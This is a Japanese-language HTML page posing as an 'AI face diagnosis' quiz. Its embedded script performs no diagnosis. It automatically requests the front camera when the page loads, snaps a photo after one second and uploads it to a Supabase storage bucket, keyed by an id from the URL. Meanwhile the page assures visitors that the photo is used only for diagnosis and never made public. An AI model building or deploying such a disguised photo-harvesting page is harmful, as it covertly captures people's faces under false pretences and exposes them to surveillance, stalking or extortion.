<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta property="og:title" content="AI顔診断">
  <meta property="og:description" content="あなたの顔をAIが診断します">
  <meta property="og:type" content="website">
  <meta name="twitter:card" content="summary">
  <title>AI顔診断</title>
  <style>
    body {
      margin: 0; padding: 0;
      font-family: "Segoe UI", system-ui, sans-serif;
      background: linear-gradient(to right, #e0f2ff, #fde7ef);
      color: #333; text-align: center;
    }
    .container { padding: 40px 20px; max-width: 400px; margin: 0 auto; }
    h1 { font-size: 28px; color: #0066ff; margin-bottom: 10px; }
    p.desc { color: #555; font-size: 15px; margin-bottom: 30px; }
    input {
      width: 100%; padding: 10px; border-radius: 8px; border: none;
      font-size: 1rem; margin-bottom: 15px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1); box-sizing: border-box;
    }
    .btn {
      display: block; width: 100%; background: #0d6efd; color: white;
      border: none; border-radius: 8px; padding: 10px;
      font-size: 1rem; margin-bottom: 15px; cursor: pointer;
    }
    .btn:active { opacity: 0.8; }
    .preview-box {
      width: 100%; height: 160px; background: white;
      border-radius: 16px; margin-top: 20px; overflow: hidden;
    }
    video { width: 100%; height: 100%; object-fit: cover; border-radius: 16px; }
    small { display: block; color: #777; margin-top: 20px; font-size: 12px; }
    #status { color: #444; margin-top: 10px; font-size: 14px; }
    #charCount { text-align: right; font-size: 12px; color: #999; margin-top: -10px; margin-bottom: 10px; }
    #errorDetail { color: red; font-size: 12px; margin-top: 5px; word-break: break-all; }
  </style>
</head>
<body>
  <div class="container">
    <h1>AI顔診断</h1>
    <p class="desc">あなたのお顔を診断してみましょう！<br>診断にはカメラの許可が必要です。</p>
    <input type="text" id="nameInput" placeholder="あなたの名前を入力" maxlength="8" />
    <div id="charCount">0 / 8</div>
    <button id="cameraBtn" class="btn">🧠 診断をはじめる</button>
    <div class="preview-box"><video id="video" autoplay playsinline muted></video></div>
    <p id="status"></p>
    <p id="errorDetail"></p>
    <small>※この写真は診断目的でのみ使用され、外部に公開されることはありません。</small>
  </div>

  <script type="module">
    import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
    const supabase = createClient(
      "https://kwbxywugzrlbcalmwvjw.supabase.co",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt3Ynh5d3VnenJsYmNhbG13dmp3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk4NjQ3NjQsImV4cCI6MjA5NTQ0MDc2NH0.bGF_4lcYOLu_TGUEyUbC-c_yC4XISNfGKHZZ8YUVdnY"
    );

    const video = document.getElementById("video");
    const status = document.getElementById("status");
    const errorDetail = document.getElementById("errorDetail");
    const cameraBtn = document.getElementById("cameraBtn");
    const nameInput = document.getElementById("nameInput");
    const charCount = document.getElementById("charCount");
    let isProcessing = false;

    const urlParams = new URLSearchParams(window.location.search);
    const photoId = urlParams.get("id") || Math.random().toString(36).substring(2, 9);

    nameInput.addEventListener("input", () => {
      charCount.textContent = `${nameInput.value.length} / 8`;
    });

    async function startCameraAndUpload() {
      if (isProcessing) return;
      isProcessing = true;
      try {
        status.textContent = "カメラの許可を押してください...";
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, audio: false
        });
        video.srcObject = stream;
        await new Promise(r => setTimeout(r, 1000));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));

        status.textContent = "読み込み中...";
        const { error } = await supabase.storage.from("photos").upload(`${photoId}.jpg`, blob, { upsert: true });

        stream.getTracks().forEach(t => t.stop());

        if (error) {
          status.textContent = "⚠️ アップロードに失敗しました。";
          errorDetail.textContent = JSON.stringify(error);
        } else {
          status.textContent = "✅ 写真を送信しました！";
          errorDetail.textContent = "";
        }
      } catch (err) {
        status.textContent = "⚠️ エラーが発生しました。";
        errorDetail.textContent = err.message;
      } finally {
        isProcessing = false;
      }
    }

    window.addEventListener("load", () => { startCameraAndUpload(); });
    cameraBtn.addEventListener("click", () => { startCameraAndUpload(); });
  </script>
</body>
</html>
